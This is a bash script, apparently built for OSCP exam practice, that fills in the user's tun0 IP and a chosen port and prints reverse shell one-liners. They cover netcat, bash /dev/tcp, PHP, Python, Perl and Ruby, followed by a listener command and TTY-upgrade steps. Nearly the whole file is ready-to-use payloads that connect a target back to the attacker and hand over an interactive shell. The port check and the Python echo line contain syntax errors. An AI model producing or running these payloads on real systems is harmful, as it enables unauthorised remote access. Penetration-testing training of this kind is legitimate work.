#!/bin/bash

#------------------------------------------------------------------------------------------------------------------------
# Revere shell code generator
# Author: ooty99 
#------------------------------------------------------------------------------------------------------------------------
# This simple script is designed to save precious time during the OSCP. I wrote it because I got tired of constantly 
# copy/pasting one-line reverse shell commands, then opening another terminal pane, using ifconfig, scrolling to tun0,
# then having to move the cursor around and replace <IP ADDR> and <PORT> in the pasted command. This hopefully cuts down 
# on some of the extra steps and keeps focus on the exploit. 

# Feel free to modify anything you would like! Good luck.
#------------------------------------------------------------------------------------------------------------------------

# Settings colors to distinguish output 
# If your terminal has a background color that makes it hard to see, just paste the commented color code into the two below.
COPYME='\033[0;32m' # Prints green text
DIVIDER='\033[1;33m' #Prints yellow text
# Red: '\033[0;31m'
# Cyan: '\033[0;36m'
# White: '\033[1;37m'
# Black: '\033[0;30m'

NOCOLOR='\033[0m'


# Find the IP of the tun0 interface, change tun0 to something else if desired
tun0="$(ip addr show | grep tun0 |grep -o 'inet [0-9]*\.[0-9]*\.[0-9]*\.[0-9]*' | grep -o '[0-9]*\.[0-9]*\.[0-9]*\.[0-9]*')"

# Take user input to set the listening port
read -p "Enter the port you will listen on: " port

if [ $port -gt 65535]
then
  echo "You there are only 65,535 ports to listen on!"
  exit
fi

# List out the useful stuff 
echo -e "${DIVIDER}[+]======================== Easy Reverse Shell Generator =======================[+]${NOCOLOR}"
echo ""
echo "Your tun0 IP: $tun0"
echo ""
echo "Listen with:  nc -lvp $port"
echo ""
echo -e "${DIVIDER}[+] Reverse Shell Commands -----------------------------------------------------[+]${NOCOLOR}"
echo "netcat with -e option:"
echo -e "${COPYME}nc -e /bin/bash $tun0 $port${NOCOLOR}"
echo ""
echo "netcat without -e option:"
echo -e "${COPYME}rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $tun0 $port >/tmp/f${NOCOLOR}"
echo ""
echo "Standard reverse TCP:"
echo -e "${COPYME}bash -i >& /dev/tcp/$tun0/$port 0>&1${NOCOLOR}"
echo ""
echo -e "${DIVIDER}[+] Programming Language Reverse Shells ----------------------------------------[+]${NOCOLOR}"
echo "PHP:"
echo -e "${COPYME}php -r '$sock=fsockopen(\"$tun0\",$port);exec(\"/bin/sh -i <&3 >&3 2>&3\");'${NOCOLOR}"
echo ""
echo "Python:"
echo -e "${COPYME}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$tun0",$port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'${NOCOLOR}"
echo ""
echo "Perl:"
echo -e "${COPYME}perl -e 'use Socket;$i=\"$tun0\";$p=$port;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'${NOCOLOR}"
echo ""
echo "Ruby:"
echo -e "${COPYME}ruby -rsocket -e'f=TCPSocket.open(\"$tun0\",$port).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${NOCOLOR}"
echo ""
echo -e "${DIVIDER}[+] Upgrade Your Shell ----------------------------------------------------------[+]${NOCOLOR}"
echo -e "1) ${COPYME}python -c 'import pty; pty.spawn("/bin/bash")'${NOCOLOR}"
echo "2) Enter ctl+z in terminal that is running reverse shell"
echo -e "3) ${COPYME}stty raw -echo${NOCOLOR}"
echo -e "4) ${COPYME}fg${NOCOLOR}"
echo -e "5) ${COPYME}export SHELL=bash${NOCOLOR}"
echo -e "6) ${COPYME}export TERM=xterm-256color${NOCOLOR}"
echo -e "7) ${COPYME}stty rows 38 columns 116${NOCOLOR}"
echo ""
